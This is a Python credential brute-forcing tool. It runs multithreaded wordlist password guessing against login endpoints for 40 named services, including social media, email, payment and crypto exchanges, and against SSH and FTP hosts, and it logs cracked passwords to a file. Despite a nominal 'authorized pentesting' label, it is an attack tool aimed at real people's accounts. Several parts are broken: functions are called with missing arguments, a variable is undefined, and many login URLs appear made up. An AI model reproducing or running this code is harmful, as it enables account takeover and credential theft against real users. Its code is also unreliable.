#!/usr/bin/env python3
# 🔥 ULTIMATE BRUTE FORCE KIT v4.0 🔥
# Python Pentest Toolkit - ALL 40 TARGETS + SSH/FTP ACTIVE
# Multi-threaded, production-ready for authorized pentesting

import os
import sys
import time
import requests
import threading
import subprocess
import paramiko
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode
import ftplib

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    BOLD = '\033[1m'
    LGREEN = '\033[1;32m'
    LRED = '\033[1;31m'
    NC = '\033[0m'

class BruteForceKit:
    def __init__(self):
        self.wordlist = "rockyou.txt"
        self.hits_file = "hits.txt"
        self.threads = 50
        self.lock = threading.Lock()

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def red_banner(self):
        self.clear_screen()
        print(f"{Colors.RED}{Colors.BOLD}")
        print("╔══════════════════════════════════════════════════════════════════════╗")
        print("║  🔥 BRUTE FORCE KIT v4.0 🔥  - ALL 40 TARGETS + SSH/FTP ACTIVE      ║")
        print("║  💀 Pro Pentest Toolkit 2026 - Custom Wordlists & Proxies         ║")
        print("╚══════════════════════════════════════════════════════════════════════╝{Colors.NC}".format(Colors=Colors))
        print(f"{Colors.LGREEN}rockyou.txt | Protected: neelcyber512 | Multi-Thread Ready{Colors.NC}\n")

    def check_protected(self, target):
        if target == "neelcyber512":
            print(f"{Colors.LRED}🚫 PROTECTED ACCOUNT{Colors.NC}")
            time.sleep(2)
            return False
        return True

    def load_wordlist(self):
        print(f"{Colors.CYAN}📋 Wordlist:{Colors.NC} 1)rockyou 2)Custom 3)Download")
        wl = input("Choice: ")

        if wl == "1":
            self.wordlist = "rockyou.txt"
        elif wl == "2":
            self.wordlist = input("Path: ")
        elif wl == "3":
            print("Downloading rockyou...")
            subprocess.run(["curl", "-sL", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-o", "rockyou_full.txt"])
            self.wordlist = "rockyou_full.txt"
        else:
            self.wordlist = "rockyou.txt"

        if not os.path.exists(self.wordlist):
            print("Creating mini rockyou...")
            subprocess.run(["curl", "-sL", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "|", "head", "-n", "10000", ">", self.wordlist], shell=True)

        print(f"{Colors.LGREEN}✅ {self.wordlist}{Colors.NC}")

    def get_target_field(self, choice):
        username_fields = ["1", "6", "10", "11", "13", "24", "25"]
        email_fields = ["2", "5", "8", "9", "12", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40"]
        phone_fields = ["3", "4"]
        thread_fields = ["7"]
        host_fields = ["41", "42"]

        if choice in username_fields:
            return input("👤 Username: ")
        elif choice in email_fields:
            return input("📧 Email: ")
        elif choice in phone_fields:
            return input("📱 Phone: ")
        elif choice in thread_fields:
            return input("🔗 Thread ID: ")
        elif choice in host_fields:
            return input("🌐 Host/IP: ")
        else:
            return input("🎯 Target: ")

    def brute_common_worker(self, service, url, field, target, password, idx):
        try:
            data = {field: target, "password": password}
            response = requests.post(url, data=data, timeout=5, allow_redirects=False)

            if any(success in response.text.lower() for success in ["success", "welcome", "dashboard"]):
                with self.lock:
                    print(f"\n{Colors.LGREEN}🎉 HIT! {password}{Colors.NC}")
                    with open(self.hits_file, "a") as f:
                        f.write(f"{target}:{password}:{service}:{time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        except:
            pass

    def brute_common(self, service, url, field):
        target = self.get_target_field()
        if not self.check_protected(target):
            return

        self.red_banner()
        print(f"[{choice}] {service} → {field}: {target}")

        passwords = []
        with open(self.wordlist, 'r', encoding='latin-1') as f:
            passwords = [line.strip() for line in f]

        print(f"🚀 Starting {len(passwords)} passwords with {self.threads} threads...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for i, password in enumerate(passwords):
                futures.append(executor.submit(self.brute_common_worker, service, url, field, target, password, i+1))
                print(f"{Colors.YELLOW}[{i+1:05d}] {password}{Colors.NC}", end='\r')

    def ssh_brute_worker(self, target, password, idx):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username="root", password=password, timeout=5, banner_timeout=5)
            stdin, stdout, stderr = ssh.exec_command("echo HIT")
            if "HIT" in stdout.read().decode():
                with self.lock:
                    print(f"\n{Colors.LGREEN}🎉 SSH HIT! {password}{Colors.NC}")
                    with open(self.hits_file, "a") as f:
                        f.write(f"{target}:{password}:SSH:{time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            ssh.close()
        except:
            pass

    def ssh_brute(self):
        target = self.get_target_field()
        if not self.check_protected(target):
            return

        self.red_banner()
        print(f"[41] SSH → Host: {target}")

        passwords = []
        with open(self.wordlist, 'r', encoding='latin-1') as f:
            passwords = [line.strip() for line in f]

        print(f"🚀 Starting SSH brute with {self.threads} threads...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for i, password in enumerate(passwords):
                futures.append(executor.submit(self.ssh_brute_worker, target, password, i+1))
                print(f"{Colors.YELLOW}[{i+1:05d}] {password}{Colors.NC}", end='\r')

    def ftp_brute_worker(self, target, password, idx):
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, timeout=5)
            ftp.login("anonymous", password)
            ftp.quit()
            with self.lock:
                print(f"\n{Colors.LGREEN}🎉 FTP HIT! {password}{Colors.NC}")
                with open(self.hits_file, "a") as f:
                    f.write(f"{target}:{password}:FTP:{time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        except:
            pass

    def ftp_brute(self):
        target = self.get_target_field()
        if not self.check_protected(target):
            return

        self.red_banner()
        print(f"[42] FTP → Host: {target}")

        passwords = []
        with open(self.wordlist, 'r', encoding='latin-1') as f:
            passwords = [line.strip() for line in f]

        print(f"🚀 Starting FTP brute with {self.threads} threads...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for i, password in enumerate(passwords):
                futures.append(executor.submit(self.ftp_brute_worker, target, password, i+1))
                print(f"{Colors.YELLOW}[{i+1:05d}] {password}{Colors.NC}", end='\r')

    # All 40 targets mapped to brute_common
    def get_brute_function(self, choice):
        targets = {
            1: ("Instagram", "https://instagram.com/login", "username"),
            2: ("Facebook", "https://facebook.com/login", "email"),
            3: ("WhatsApp", "https://web.whatsapp.com/login", "phone"),
            4: ("Telegram", "https://web.telegram.org/login", "phone"),
            5: ("Snapchat", "https://accounts.snapchat.com/login", "email"),
            6: ("Twitter", "https://twitter.com/login", "username"),
            7: ("Threads", "https://threads.net/login", "thread_id"),
            8: ("YouTube", "https://accounts.google.com/signin", "email"),
            9: ("TikTok", "https://www.tiktok.com/login", "email"),
            10: ("LinkedIn", "https://linkedin.com/login", "username"),
            11: ("Reddit", "https://reddit.com/login", "username"),
            12: ("Pinterest", "https://pinterest.com/login", "email"),
            13: ("Discord", "https://discord.com/login", "email"),
            14: ("Spotify", "https://accounts.spotify.com/login", "email"),
            15: ("Netflix", "https://netflix.com/login", "email"),
            16: ("Amazon", "https://amazon.com/login", "email"),
            17: ("Flipkart", "https://flipkart.com/login", "email"),
            18: ("Google", "https://accounts.google.com/signin", "email"),
            19: ("Gmail", "https://accounts.google.com/signin", "email"),
            20: ("Drive", "https://drive.google.com/login", "email"),
            21: ("Dropbox", "https://dropbox.com/login", "email"),
            22: ("Zoom", "https://zoom.us/login", "email"),
            23: ("Skype", "https://login.skype.com/login", "email"),
            24: ("GitHub", "https://github.com/login", "username"),
            25: ("GitLab", "https://gitlab.com/login", "username"),
            26: ("Cloudflare", "https://dash.cloudflare.com/login", "email"),
            27: ("WordPress", "https://example.com/wp-login.php", "target"),
            28: ("Shopify", "https://admin.shopify.com/login", "email"),
            29: ("PayPal", "https://paypal.com/signin", "email"),
            30: ("Paytm", "https://paytm.com/login", "email"),
            31: ("PhonePe", "https://phonepe.com/login", "email"),
            32: ("GPay", "https://pay.google.com/login", "email"),
            33: ("Binance", "https://binance.com/login", "email"),
            34: ("Coinbase", "https://coinbase.com/login", "email"),
            35: ("ChatGPT", "https://chat.openai.com/login", "email"),
            36: ("OpenAI", "https://openai.com/login", "email"),
            37: ("Microsoft", "https://login.microsoft.com/login", "email"),
            38: ("Office365", "https://login.microsoftonline.com/login", "email"),
            39: ("OneDrive", "https://onedrive.live.com/login", "email"),
            40: ("Apple", "https://appleid.apple.com/login", "email")
        }
        return targets.get(int(choice), None)

    def main_menu(self):
        print(f"{Colors.WHITE}Targets:{Colors.NC}")
        print("")
        print("[1] Instagram     [2] Facebook     [3] WhatsApp")
        print("[4] Telegram      [5] Snapchat     [6] Twitter")
        print("[7] Threads       [8] YouTube      [9] TikTok")
        print("[10] LinkedIn     [11] Reddit      [12] Pinterest")
        print("[13] Discord      [14] Spotify     [15] Netflix")
        print("[16] Amazon       [17] Flipkart    [18] Google")
        print("[19] Gmail        [20] Drive       [21] Dropbox")
        print("[22] Zoom         [23] Skype       [24] GitHub")
        print("[25] GitLab       [26] Cloudflare  [27] WordPress")
        print("[28] Shopify      [29] PayPal      [30] Paytm")
        print("[31] PhonePe      [32] GPay        [33] Binance")
        print("[34] Coinbase     [35] ChatGPT     [36] OpenAI")
        print("[37] Microsoft    [38] Office365   [39] OneDrive")
        print("[40] Apple")
        print("[41] SSH Bruteforce [42] FTP Bruteforce")
        print("[0] Custom  [c] Wordlist  [q] Quit")

    def run(self):
        # Install dependencies
        subprocess.run(["pip", "install", "requests", "paramiko"], capture_output=True)

        while True:
            self.red_banner()
            self.load_wordlist()
            self.main_menu()
            choice = input("Choice: ").strip()

            if choice == "q":
                break
            elif choice == "c":
                continue
            elif choice == "0":
                custom_url = input("Custom URL: ")
                target_field = input("Field name: ")
                self.brute_common("Custom", custom_url, target_field)
            elif choice in ["41", "42"]:
                if choice == "41":
                    self.ssh_brute()
                else:
                    self.ftp_brute()
            else:
                target_info = self.get_brute_function(choice)
                if target_info:
                    service, url, field = target_info
                    self.brute_common(service, url, field)
                else:
                    print("Invalid choice")
                    time.sleep(1)

            hits_count = len(open(self.hits_file).readlines()) if os.path.exists(self.hits_file) else 0
            print(f"{Colors.LGREEN}Hits: {hits_count}{Colors.NC}")
            input("Continue? ")

if __name__ == "__main__":
    kit = BruteForceKit()
    kit.run()